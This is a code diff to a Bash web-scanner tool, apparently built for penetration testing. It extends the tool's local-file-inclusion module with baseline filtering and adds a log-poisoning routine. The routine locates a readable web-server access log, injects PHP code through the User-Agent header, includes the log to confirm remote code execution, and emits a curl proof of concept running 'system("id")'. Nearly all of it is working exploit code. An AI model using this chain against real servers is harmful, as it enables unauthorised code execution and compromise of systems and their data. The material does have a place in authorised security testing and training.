@@ -368,6 +368,14 @@ _lfi_auto_read() {
   # Windows targets (used if non-unix detected)
   # local -a targets_win=("windows/win.ini" "windows/system32/drivers/etc/hosts")
 
+  # Get baseline response (non-existent file) to filter false reads
+  local baseline_file="${lfi_reads_dir}/_baseline.txt"
+  _lfi_request "$url" "$param" "${bypass_prefix}traktr_nonexistent_baseline_file.xyz" "$method" "$baseline_file" > /dev/null 2>&1
+  local baseline_size=0
+  [[ -f "$baseline_file" ]] && baseline_size=$(wc -c < "$baseline_file" 2>/dev/null || echo 0)
+  local baseline_md5=""
+  [[ -f "$baseline_file" ]] && baseline_md5=$(md5sum "$baseline_file" 2>/dev/null | cut -d' ' -f1)
+
   echo -e "\033[1;36m  ┌─── LFI Auto-Read Results ───────────────────────────\033[0m" >&2
   local files_read=0
 
@@ -384,22 +392,45 @@ _lfi_auto_read() {
 
     local fsize=0
     [[ -f "$resp_file" ]] && fsize=$(wc -c < "$resp_file" 2>/dev/null || echo 0)
-    if [[ "$fsize" -gt 10 ]]; then
-      # Verify it's not the same as baseline (actual file content vs error page)
-      local sig_type=""
-      sig_type=$(_lfi_check_signatures "$resp_file" 2>/dev/null) || true
-      if [[ -n "$sig_type" ]] || [[ "$fsize" -gt 50 ]]; then
-        ((files_read++)) || true
-        local preview; preview=$(strings "$resp_file" 2>/dev/null | head -8)
-        echo -e "\033[1;32m  │ /$target_file\033[0m \033[2m(${fsize} bytes)\033[0m" >&2
-        echo "$preview" | while IFS= read -r line; do
-          echo -e "\033[2m  │   ${line}\033[0m" >&2
-        done
-      fi
+    # Skip empty or tiny responses
+    [[ "$fsize" -le 10 ]] && continue
+
+    # Skip if response is identical to baseline (same default page)
+    local resp_md5=""
+    resp_md5=$(md5sum "$resp_file" 2>/dev/null | cut -d' ' -f1)
+    [[ "$resp_md5" == "$baseline_md5" ]] && { rm -f "$resp_file"; continue; }
+
+    # Skip if size matches baseline within 5% tolerance (catch-all page)
+    local size_diff=$(( fsize - baseline_size ))
+    [[ ${size_diff#-} -lt 20 ]] && [[ "$baseline_size" -gt 100 ]] && { rm -f "$resp_file"; continue; }
+
+    # Verify content has signatures or is genuinely different
+    local sig_type=""
+    sig_type=$(_lfi_check_signatures "$resp_file" 2>/dev/null) || true
+
+    if [[ -n "$sig_type" ]] || [[ $size_diff -gt 200 ]] || [[ $size_diff -lt -200 ]]; then
+      ((files_read++)) || true
+      local preview
+      preview=$(strings "$resp_file" 2>/dev/null | head -8)
+      echo -e "\033[1;32m  │ /$target_file\033[0m \033[2m(${fsize} bytes)\033[0m" >&2
+      while IFS= read -r line; do
+        echo -e "\033[2m  │   ${line}\033[0m" >&2
+      done <<< "$preview"
+    else
+      rm -f "$resp_file"
     fi
   done
+  rm -f "$baseline_file"
 
   echo -e "\033[1;36m  └─── ${files_read} files read ────────────────────────────\033[0m" >&2
+
+  # ── LOG POISONING / RCE ESCALATION ──
+  local oscp="${OSCP:-false}"
+  if [[ "$oscp" != true ]]; then
+    _lfi_log_poison "$url" "$param" "$bypass_prefix" "$method" "$lfi_reads_dir" "$baseline_size" "$baseline_md5"
+  else
+    echo -e "\033[2m  [OSCP] Skipping log poisoning (destructive technique)\033[0m" >&2
+  fi
 
   # Save summary
   {
@@ -408,6 +439,95 @@ _lfi_auto_read() {
     echo "Files successfully read: $files_read"
     find "$lfi_reads_dir" -name '*.txt' -printf '%p %s bytes\n' 2>/dev/null
   } > "${lfi_reads_dir}/summary.txt"
+}
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  LOG POISONING: Attempt RCE via LFI + access log injection
+# ═══════════════════════════════════════════════════════════════════════════
+_lfi_log_poison() {
+  local url="$1" param="$2" bypass_prefix="$3" method="$4" outdir="$5"
+  local baseline_size="${6:-0}" baseline_md5="${7:-}"
+
+  # Log file paths to try including
+  local -a log_paths=(
+    "var/log/apache2/access.log"
+    "var/log/apache/access.log"
+    "var/log/httpd/access_log"
+    "var/log/nginx/access.log"
+    "var/log/nginx/error.log"
+    "var/log/apache2/error.log"
+    "proc/self/fd/1"
+    "var/log/syslog"
+  )
+
+  echo -e "\033[1;35m  ┌─── Log Poisoning Check ──────────────────────────────\033[0m" >&2
+
+  # Step 1: Check which log files are readable
+  local readable_log=""
+  for logpath in "${log_paths[@]}"; do
+    local payload="${bypass_prefix}${logpath}"
+    local resp_file
+    resp_file="${outdir}/logcheck_$(echo "$logpath" | tr '/' '_').txt"
+    _lfi_request "$url" "$param" "$payload" "$method" "$resp_file" > /dev/null 2>&1
+
+    local fsize=0
+    [[ -f "$resp_file" ]] && fsize=$(wc -c < "$resp_file" 2>/dev/null || echo 0)
+    local resp_md5
+    resp_md5=$(md5sum "$resp_file" 2>/dev/null | cut -d' ' -f1)
+
+    # Check if different from baseline AND contains log-like content
+    if [[ "$resp_md5" != "$baseline_md5" ]] && [[ "$fsize" -gt 50 ]]; then
+      if grep -qiP 'GET /|POST /|HTTP/1\.|Mozilla|User-Agent' "$resp_file" 2>/dev/null; then
+        readable_log="$logpath"
+        echo -e "\033[1;32m  │ Readable log: /$logpath\033[0m" >&2
+        rm -f "$resp_file"
+        break
+      fi
+    fi
+    rm -f "$resp_file"
+  done
+
+  if [[ -z "$readable_log" ]]; then
+    echo -e "\033[2m  │ No readable log files found\033[0m" >&2
+    echo -e "\033[1;35m  └─── Log poisoning: not viable ─────────────────────\033[0m" >&2
+    return
+  fi
+
+  # Step 2: Inject PHP code via User-Agent header
+  local poison_marker
+  poison_marker="TRAKTR_RCE_$(date +%s)"
+  local php_payload="<?php echo '${poison_marker}'; ?>"
+  local target_base="${url%%\?*}"
+
+  # Send a request with poisoned User-Agent to get it logged
+  curl -sk -o /dev/null --max-time 5 \
+    -H "User-Agent: ${php_payload}" \
+    "${target_base}/" 2>/dev/null || true
+
+  # Step 3: Include the log file and check if our code executed
+  sleep 1
+  local rce_file="${outdir}/logpoison_rce_check.txt"
+  local log_payload="${bypass_prefix}${readable_log}"
+  _lfi_request "$url" "$param" "$log_payload" "$method" "$rce_file" > /dev/null 2>&1
+
+  if grep -q "$poison_marker" "$rce_file" 2>/dev/null; then
+    echo -e "\033[1;31m  │ ★ RCE CONFIRMED via log poisoning!\033[0m" >&2
+    echo -e "\033[1;31m  │   Log: /$readable_log\033[0m" >&2
+    echo -e "\033[1;31m  │   Method: User-Agent PHP injection\033[0m" >&2
+
+    # Generate a PoC that reads /etc/hostname via RCE
+    local encoded_log
+    encoded_log=$(encode_payload "$log_payload" url 2>/dev/null || echo "$log_payload")
+    echo -e "\033[1;33m  │   PoC: curl -sk -H 'User-Agent: <?php system(\"id\"); ?>' '${target_base}/' && curl -sk '${url}?${param}=${encoded_log}'\033[0m" >&2
+
+    # Save RCE finding
+    echo "{\"type\":\"rce_log_poison\",\"url\":\"$url\",\"param\":\"$param\",\"log_file\":\"/$readable_log\",\"confidence\":\"HIGH\",\"proof\":\"${poison_marker} found in response\",\"curl\":\"curl -sk -H 'User-Agent: <?php system(\\\"id\\\"); ?>' '${target_base}/' && curl -sk '${url}?${param}=${encoded_log}'\"}" >> "${outdir}/../vuln/lfi.json" 2>/dev/null || true
+  else
+    echo -e "\033[2m  │ Log readable but code not executed (PHP not processing log)\033[0m" >&2
+  fi
+  rm -f "$rce_file"
+
+  echo -e "\033[1;35m  └─── Log poisoning check complete ────────────────────\033[0m" >&2
 }
 
 # ── HTTP request helper (returns status|size|time) ──────────────────────────
